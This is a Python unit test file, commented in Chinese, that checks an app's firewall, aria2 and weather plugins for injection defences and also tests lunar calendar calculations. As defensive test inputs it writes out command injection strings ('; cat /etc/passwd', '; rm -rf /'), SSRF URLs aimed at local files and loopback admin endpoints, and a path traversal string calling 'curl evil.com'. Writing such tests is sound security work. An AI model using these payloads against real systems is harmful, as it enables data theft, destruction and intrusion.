# -*- coding: utf-8 -*-
"""
test_p0_security.py - P0 级别安全与核心 Bug 修复回归测试
"""

import os
import unittest
import datetime
from app.plugins import firewall_plugin, aria2_plugin
from app.weather_calendar_helper import get_wttr_weather
from app.calendar_helper import _get_lunar_year_days, get_lunar_date


class TestP0Security(unittest.TestCase):

    def test_firewall_command_injection_defense(self):
        """测试防火墙插件对命令注入的防御"""
        os.environ["FAIL2BAN_CONTAINER_NAME"] = "mock-guard"

        # 1. 尝试在 jail 中注入命令
        res = firewall_plugin.execute({"action": "status", "jail": "caddy; cat /etc/passwd"})
        self.assertEqual(res["status"], "error")
        self.assertIn("非法 jail 名称", res["message"])

        # 2. 尝试在 IP 中注入 Shell 指令
        res = firewall_plugin.execute({"action": "unban", "jail": "caddy", "ip": "1.2.3.4; rm -rf /"})
        self.assertEqual(res["status"], "error")
        self.assertIn("目标 IP 格式非法", res["message"])

    def test_aria2_ssrf_and_protocol_injection_defense(self):
        """测试 Aria2 插件对 SSRF 与协议注入的拦截"""
        os.environ["ARIA2_RPC_URL"] = "http://127.0.0.1:6800/jsonrpc"

        # 1. 本地文件协议拦截
        res = aria2_plugin.execute({"action": "add", "url": "file:///etc/passwd"})
        self.assertEqual(res["status"], "error")
        self.assertIn("不支持的下载协议", res["message"])

        # 2. 本地回环地址拦截
        res = aria2_plugin.execute({"action": "add", "url": "http://127.0.0.1:8999/notify"})
        self.assertEqual(res["status"], "error")
        self.assertIn("安全拦截", res["message"])

        res = aria2_plugin.execute({"action": "add", "url": "http://localhost/admin"})
        self.assertEqual(res["status"], "error")
        self.assertIn("安全拦截", res["message"])

    def test_weather_city_sanitization(self):
        """测试天气接口对恶意路径和特殊字符的净化"""
        res = get_wttr_weather("../../etc/passwd;curl%20evil.com")
        # 路径穿越和特殊字符应被清洗掉
        self.assertNotIn("..", res["city"])
        self.assertNotIn("/", res["city"])
        self.assertNotIn(";", res["city"])

    def test_lunar_calendar_year_days_and_date_accuracy(self):
        """测试农历年总天数计算与公历转农历核心算法的准确度"""
        # 农历平年约为 353~355 天，闰年约为 383~385 天，绝不可能超过 400 天
        for year in [1900, 2024, 2025, 2026, 2050]:
            days = _get_lunar_year_days(year)
            self.assertGreaterEqual(days, 353, f"{year}年农历天数过少: {days}")
            self.assertLessEqual(days, 385, f"{year}年农历天数过多: {days}")

        # 2024 年大年初一: 2024-02-10 -> 农历正月初一
        lunar_2024 = get_lunar_date(datetime.date(2024, 2, 10))
        self.assertEqual(lunar_2024["lunar_year"], 2024)
        self.assertEqual(lunar_2024["lunar_month"], 1)
        self.assertEqual(lunar_2024["lunar_day"], 1)

        # 2025 年大年初一: 2025-01-29 -> 农历正月初一
        lunar_2025 = get_lunar_date(datetime.date(2025, 1, 29))
        self.assertEqual(lunar_2025["lunar_year"], 2025)
        self.assertEqual(lunar_2025["lunar_month"], 1)
        self.assertEqual(lunar_2025["lunar_day"], 1)


if __name__ == "__main__":
    unittest.main()
